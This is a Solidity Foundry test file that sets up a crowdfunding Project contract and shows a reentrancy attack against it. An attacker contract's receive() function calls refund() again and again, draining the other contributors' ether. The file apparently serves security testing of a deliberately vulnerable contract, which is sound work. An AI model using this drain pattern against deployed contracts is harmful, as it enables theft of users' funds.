// SPDX-License-Identifier: UNLICENSED 
pragma solidity ^0.8.19;

import "../src/ProjectFactory.sol";
import "../src/Project.sol";

import "forge-std/console.sol";
import "forge-std/test.sol";

contract TestReentrancy is Test {

    Hacker hacker = new Hacker();
    address creator = address(0x2);
    address victim = address(0x3);
    Project project;

    function setUp() public {
        
        vm.deal(creator, 1 ether);
        vm.deal(victim, 200 ether);
        vm.deal(address(hacker), 10 ether);

        vm.startPrank(creator);
        ProjectFactory factory = new ProjectFactory();
        project = Project(factory.create(100 ether, "vulnerable", "REENT"));
        vm.stopPrank();
       
    }

    function testReentrancy() public { 
        
        // victim donates 90 eth
        vm.startPrank(victim);
        project.contribute{value: 90 ether}();
        vm.stopPrank();

        // hacker donates 1 eth
        vm.startPrank(address(hacker));
        project.contribute{value: 1 ether}();


        // project fails
        vm.warp(block.timestamp + 31 days);


        // hacker withdraws
        project.refund();

        assertTrue(address(hacker).balance > 10);
        
    }
}


contract Hacker {

    receive() external payable {
        if (msg.sender.balance > 0) {
            Project proj = Project(msg.sender);
            proj.refund();
        }
    }
}